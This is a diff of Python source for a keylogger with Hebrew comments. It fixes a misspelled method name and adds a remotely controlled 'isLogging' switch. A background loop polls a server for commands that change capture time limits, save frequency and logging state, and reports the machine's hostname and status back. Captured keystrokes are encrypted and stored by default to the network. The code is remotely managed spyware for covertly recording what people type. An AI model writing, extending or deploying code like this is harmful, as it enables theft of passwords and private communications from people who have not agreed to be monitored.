@@ -10,19 +10,16 @@ import socket
 
 
 class Main:
-
     def __init__(self):
         self.run_keylog = Manager(timeLimit=0)
         self.keep_reporting = True  # דגל שימשיך לדווח גם לאחר שהפסיק את הקילוג
-        self.start_keyloog()
+        self.start_keylog()  # תיקון שגיאת כתיב
         self.start_check_server()
 
-    def start_keyloog(self):
-        # הפעלת KeyLogger
+    def start_keylog(self):  # תיקון שגיאת כתיב
         threading.Thread(target=self.run_keylog.start, daemon=True).start()
 
     def start_check_server(self):
-        # הפעלת דיווח סטטוס ברקע
         threading.Thread(target=self.report_status_loop, daemon=True).start()
 
     def report_status_loop(self):
@@ -41,30 +38,42 @@ class Main:
                             s_naw["timeLimit"] = new_status["timeLimit"] if new_status["timeLimit"] is not None else 0
                         if "saveFrequency" in new_status:
                             s_naw["time_wright"] = new_status["saveFrequency"]
+                        if "isLogging" in new_status:
+                            s_naw["isLogging"] = new_status["isLogging"]
+                            if new_status["isLogging"]:
+                                self.run_keylog.keylogger.start_logging()  # תיקון
+                            else:
+                                self.run_keylog.keylogger.stop_logging()  # תיקון
                     except Exception as e:
                         print(f"שגיאה בעיבוד השינויים: {e}")
                 elif response.status_code == 404:  # אין שינויים
                     print("אין שינויים זמינים בשרת")
-                # שלח עדכון סטטוס גם אם אין שינויים
-                # self.server_status_update("true" if self.running else "false")
-
                 self.run_keylog.stop()
-                self.run_keylog = Manager(timeLimit=s_naw["timeLimit"], storageLocation=s_naw["storageLocation"],
-                                          time_wright=s_naw["time_wright"])
-                self.start_keyloog()
+                self.run_keylog = Manager(
+                    timeLimit=s_naw["timeLimit"],
+                    storageLocation=s_naw["storageLocation"],
+                    time_wright=s_naw["time_wright"]
+                )
+                self.run_keylog.is_logging = s_naw["isLogging"]  # שמירת מצב ההאזנה
+                if self.run_keylog.is_logging:
+                    self.start_keylog()
+                self.server_status_update("true" if self.run_keylog.running else "false")
             else:
                 print("לא התקבלה תגובה מהשרת")
-            time.sleep(40)  # המתן 10 דקות לפני הדיווח הבא
+            time.sleep(40)
+
+    def server_status_update(self, connected):  # הוספת שיטה חסרה
+        self.run_keylog.server_status_update(connected)
 
 
 class Manager:
-
     def __init__(self, timeLimit=0, storageLocation="network", time_wright=20):
         self.time_wright = time_wright
         self.keylogger = KeyLogger()
         self.write_keys = Write_keys()
         self.encryption = Encryption(5)
         self.running = False
+        self.is_logging = True  # ברירת מחדל: האזנה פעילה
         self.storageLocation = storageLocation
         self.timeLimit = timeLimit
         self.hostname = socket.gethostname()
@@ -84,11 +93,9 @@ class Manager:
                     print("------------------7777---------------")
                     self.keylogger.clear_buffer()
 
-                # אם הזמן עבר, עצור את ההקלטה
                 if self.timeLimit > 0 and time.time() - start_time >= self.timeLimit:
                     self.stop()
                     self.server_status_update("false")
-
             except Exception as e:
                 print(f"Error collecting keystrokes: {e}")
 
@@ -100,17 +107,23 @@ class Manager:
             "connected": connected,
             "timeLimit": self.timeLimit,
             "storageLocation": self.storageLocation,
+            "isLogging": self.is_logging,
             "lastSeen": datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
         }
         print(f"Sending status update: {status}")
         RequestManager().handle_request('POST', "status", status)
 
     def status_naw(self):
-        status = {"timeLimit": self.timeLimit, "storageLocation": self.storageLocation, "time_wright": self.time_wright}
+        status = {
+            "timeLimit": self.timeLimit,
+            "storageLocation": self.storageLocation,
+            "time_wright": self.time_wright,
+            "isLogging": self.is_logging
+        }
         return status
 
     def start(self):
-        if not self.running:  # ודא שלא מפעילים אותו פעמיים
+        if not self.running and self.is_logging:
             self.running = True
             self.keylogger.start_logging()
             threading.Thread(target=self.collect_keys, daemon=True).start()
